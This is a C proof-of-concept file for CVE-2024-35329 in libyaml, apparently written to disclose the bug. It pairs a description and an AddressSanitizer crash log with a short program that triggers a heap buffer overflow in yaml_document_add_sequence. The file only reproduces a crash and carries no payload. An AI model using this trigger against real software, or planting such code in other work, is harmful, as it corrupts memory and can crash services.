/* CVE-2024-35329
Target:
    https://github.com/yaml/libyaml
    latest verify at 20240507, commit abd744ec2fb3b8e38e01796a1485c1f25f8fb5f6

Description:
    we init `yaml_document_t` struct and call api `yaml_document_add_sequence`
    bug in libyaml/src/api.c:1274:10
        PUSH(&context, document->nodes, node)
            -> yaml_stack_extend(...)
                -> yaml_realloc    // document->nodes->[start, end, top] = 0, will return malloc(1)
        but node is yaml_node_t struct, will cause overflow, it should be yaml_node_t struct point size

POC:
╰─ make build && ./poc
heap-buffer-overflow on libyaml/src/api.c:1274:10
=================================================================
==1844679==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000010 at pc 0x0000004c9926 bp 0x7fff44289850 sp 0x7fff44289848
WRITE of size 4 at 0x602000000010 thread T0
    #0 0x4c9925 in yaml_document_add_sequence ~/idhyt/libyaml/poc/libyaml/src/api.c:1274:10
    #1 0x4c338b in poc ~/idhyt/libyaml/poc/./buffer-overflow-on-nodes.c:18:5
    #2 0x4c338b in main ~/idhyt/libyaml/poc/./buffer-overflow-on-nodes.c:24:5
    #3 0x7eff220be082 in __libc_start_main /build/glibc-e2p3jK/glibc-2.31/csu/../csu/libc-start.c:308:16
    #4 0x41b2fd in _start (~/idhyt/libyaml/poc/poc+0x41b2fd)

0x602000000011 is located 0 bytes to the right of 1-byte region [0x602000000010,0x602000000011)
allocated by thread T0 here:
    #0 0x493a3d in malloc (~/idhyt/libyaml/poc/poc+0x493a3d)
    #1 0x4c97b0 in yaml_realloc ~/idhyt/libyaml/poc/libyaml/src/api.c:43:50
    #2 0x4c97b0 in yaml_stack_extend ~/idhyt/libyaml/poc/libyaml/src/api.c:126:17
    #3 0x4c97b0 in yaml_document_add_sequence ~/idhyt/libyaml/poc/libyaml/src/api.c:1274:10
    #4 0x4c338b in poc ~/idhyt/libyaml/poc/./buffer-overflow-on-nodes.c:18:5
    #5 0x4c338b in main ~/idhyt/libyaml/poc/./buffer-overflow-on-nodes.c:24:5
    #6 0x7eff220be082 in __libc_start_main /build/glibc-e2p3jK/glibc-2.31/csu/../csu/libc-start.c:308:16

SUMMARY: AddressSanitizer: heap-buffer-overflow ~/idhyt/libyaml/poc/libyaml/src/api.c:1274:10 in yaml_document_add_sequence
Shadow bytes around the buggy address:
  0x0c047fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c047fff8000: fa fa[01]fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==1844679==ABORTING
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <yaml.h>

void poc() {
    yaml_document_t document;
    memset(&document, 0, sizeof(yaml_document_t));
    yaml_char_t *anchor = "rsslab";
    yaml_char_t *tag = "tag:yaml.org,2002:str";
    int style = YAML_ANY_SEQUENCE_STYLE;
    yaml_document_add_sequence(&document, tag, style);
}

int main(int argc, char *argv[])
{
    printf("heap-buffer-overflow on libyaml/src/api.c:1274:10\n");
    poc();
    return 0;
}
